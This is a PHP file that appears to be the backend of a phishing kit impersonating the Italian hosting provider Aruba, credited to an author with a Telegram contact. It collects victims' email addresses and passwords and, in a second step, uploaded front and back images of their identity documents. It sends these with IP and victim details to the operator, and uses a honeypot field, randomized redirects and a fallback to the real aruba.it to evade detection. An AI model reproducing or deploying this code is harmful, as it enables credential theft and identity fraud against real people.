<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    include 'app.php';

    if( isset($_GET["redirection"]) && !empty($_GET['redirection']) ) {

        $red = $_GET['redirection'];
        $_SESSION['last_page'] = $red;
        $query = [];
        $parse_url = proper_parse_str($_SERVER['QUERY_STRING']);
        foreach($parse_url as $key => $val) {
            if( $key == 'redirection' || $key == 'prefix' ){
                unset($parse_url[$key]);
            } else {
                $query[] = $key . '=' . $val;
            }
        }
        if( is_array($query) ) {
            $query = "?" . implode('&',$query);
        }

        if( isset($_GET['prefix']) ) {
            $_SESSION['prefix'] = $_GET['prefix'];
        }

        header("Location: " . randomix(24) . $query);
        exit();

    } else if( isset($_GET["lang"]) && !empty($_GET['lang']) ) {

        $_SESSION['lang'] = $_GET["lang"];
        location($_SESSION['last_page']);

    } else if( $_SERVER['REQUEST_METHOD'] == "POST" ) {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "login" ) {
            $_SESSION['errors'] = [];
            $_SESSION['email']   = $_POST['email'];
            $_SESSION['password']   = $_POST['password'];
            if( validate_email($_POST['email']) == false ) {
                $_SESSION['errors']['email'] = true;
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ARUBA | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Email : ' . $_POST['email'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    location('id');
                }
                location('login','&error=1');
            } else {
                $error = $_POST['error'];
                location('login','&error=' . $error);
            }
        }

        if ($_POST['steeep'] == "id") {
            $_SESSION['errors']     = [];
            $_SESSION['recto_file']   = $_POST['recto_file'];
            $_SESSION['verso_file']   = $_POST['verso_file'];
            if( empty($_POST['recto_file']) ) {
                $_SESSION['errors']['recto_file'] = true;
            }
            if( empty($_POST['verso_file']) ) {
                $_SESSION['errors']['verso_file'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ARUBA | ID';
                $message = '/-- UPLOAD FILE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Recto ID : ' . $_POST['recto_file'] . "\r\n";
                $message .= 'Verso ID : ' . $_POST['verso_file'] . "\r\n";
                $message .= '/-- END UPLOAD FILE INFOS --/' . "\r\n";
                send($subject,$message);
                location('success');
            } else {
                location('id','&error=1');
            }
        }

        if ($_GET['step'] == "upload") {
            $_SESSION['errors']      = [];
            $filename = $_GET['filename'];
            $url     = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $x       = pathinfo($url);
            $dirname = explode('/',$x['dirname']);
            //array_pop($dirname);
            $dirname = implode('/',$dirname) . '/upload/';
            if( empty($_FILES[$filename]['name']) ) {
                echo 'error';
                exit();
            }
            $carte = upload_file($_FILES[$filename],$filename);
            if( $carte !== false ) {
                echo $dirname . $carte;
                exit();
            }
            echo 'error';
            exit();
        }

    } else {

        if( isset($_SESSION['last_page']) ) {
            redirect($_SESSION['last_page']);
        }

        header("Location: https://www.aruba.it/");
        exit();

    }
    

?>